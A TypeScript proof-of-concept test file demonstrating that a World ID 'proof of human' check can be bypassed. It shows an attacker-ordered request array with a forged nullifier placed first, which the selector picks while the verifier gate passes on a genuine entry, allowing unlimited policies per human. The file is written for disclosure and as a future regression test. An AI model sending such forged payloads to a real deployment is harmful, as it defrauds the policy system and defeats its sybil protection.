// PoC — the policy-human authorization is signed over a nullifier the World ID
// verifier never validated.
//
// Run:  node --experimental-strip-types --test test/policy-human-nullifier-binding.poc.test.ts
//
// These tests assert the SECURITY PROPERTY that should hold. They FAIL on the
// current code, and that failure is the demonstration. After a fix that binds
// the signed nullifier to the verifier's own answer, they turn green and become
// regression tests.
//
// Nothing here touches the network, a deployment, or a signing key.

import assert from "node:assert/strict";
import test from "node:test";

import {
  derivePolicyNullifier,
  hasVerifiedPolicyHumanResult,
  selectPolicyHumanResponse
} from "../lib/world/policy-human-proof.ts";

const ACTION = "riska-policy-human-v1";

// The wallet the attacker is enrolling. Both responses below carry this
// signal_hash, so both pass the wallet-binding check.
const signalHash = `0x${"ab".repeat(32)}`;

// The nullifier World actually issued to this human.
const GENUINE = "0x2a";
// A nullifier the attacker invented. Never seen by World, never proven.
const FORGED = "0xdeadbeef";

// What the attacker POSTs to /api/identity/verify-policy-human. The `responses`
// array comes straight from the request body (verify-policy-human-handler.ts:174)
// and is relayed verbatim to World (…:208), so its ORDER is attacker-controlled.
const attackerResponses = [
  { identifier: "proof_of_human", nullifier: FORGED, signal_hash: signalHash },
  { identifier: "proof_of_human", nullifier: GENUINE, signal_hash: signalHash }
];

// What World returns for that payload, per its documented v4 contract:
//   - "200: At least one proof verified successfully" (400 only if ALL fail)
//   - each VerifyV4Result carries { identifier, success, nullifier, code, detail }
// The forged entry fails verification; the genuine one passes.
// Sources: docs.world.org/api-reference/developer-portal/verify
const worldResults = [
  { identifier: "proof_of_human", success: false, nullifier: FORGED },
  { identifier: "proof_of_human", success: true, nullifier: GENUINE }
];

test("PoC 1 — the selected response is the attacker's, because .find() takes the first match", () => {
  const selected = selectPolicyHumanResponse(attackerResponses, signalHash, "proof_of_human");

  // policy-human-proof.ts:27 uses responses.find(...), and the attacker ordered
  // the array. The forged entry wins purely by being first.
  assert.equal(selected?.nullifier, FORGED);
});

test("PoC 2 — the verifier gate passes even though the selected response was rejected", () => {
  // policy-human-proof.ts:52 asks only: does ANY result carry this identifier
  // with success === true? The genuine entry satisfies it. The selected
  // (forged) entry is never consulted.
  assert.equal(hasVerifiedPolicyHumanResult(worldResults, "proof_of_human"), true);

  // For contrast: World did report the forged nullifier as unverified.
  const verdictForSelected = worldResults.find((r) => r.nullifier === FORGED);
  assert.equal(verdictForSelected?.success, false);
});

test("PoC 3 — SECURITY PROPERTY: the signed nullifier must be one the verifier validated", () => {
  const selected = selectPolicyHumanResponse(attackerResponses, signalHash, "proof_of_human");

  // verify-policy-human-handler.ts:256 derives the on-chain sybil key from the
  // SELECTED response — i.e. from the request body.
  const signed = derivePolicyNullifier({ action: ACTION, nullifier: selected!.nullifier! });

  // The only nullifier World actually vouched for.
  const validated = worldResults.filter((r) => r.success).map((r) => r.nullifier);

  // This is the property that must hold. It does not hold today.
  assert.ok(
    validated.some((n) => derivePolicyNullifier({ action: ACTION, nullifier: n }).nullifierHash === signed.nullifierHash),
    `signed nullifierHash ${signed.nullifierHash} was derived from a nullifier the verifier never validated ` +
      `(validated: ${validated.join(", ")}). RiskaPolicyManager.openPolicy enforces one-policy-per-human solely ` +
      `via policyOfNullifierHash[...] == 0 plus this signature, so a freely chosen hash means unbounded policies ` +
      `per human.`
  );
});

test("PoC 4 — each forged nullifier yields a fresh on-chain key, so the cap is unbounded", () => {
  // openPolicy rejects a nullifierHash it has seen. Distinct invented nullifiers
  // produce distinct hashes, so the same human enrolls from every wallet.
  const hashes = new Set(
    ["0x01", "0x02", "0x03", "0x04"].map(
      (n) => derivePolicyNullifier({ action: ACTION, nullifier: n }).nullifierHash
    )
  );

  assert.equal(hashes.size, 4);
});

test("PoC 5 — the existing suite's own expectation is what permits this", () => {
  // test/policy-human-proof.test.ts:70 is named
  //   "requires the World verifier to validate the selected v4 response"
  // but never references the selected response. It asserts that a mixed array
  // returns true — which is precisely the shape this attack produces.
  const mixed = [
    { identifier: "proof_of_human", success: false },
    { identifier: "proof_of_human", success: true }
  ];

  assert.equal(hasVerifiedPolicyHumanResult(mixed, "proof_of_human"), true);

  // So the gap is currently protected by a passing test whose name asserts a
  // property the test does not check.
});
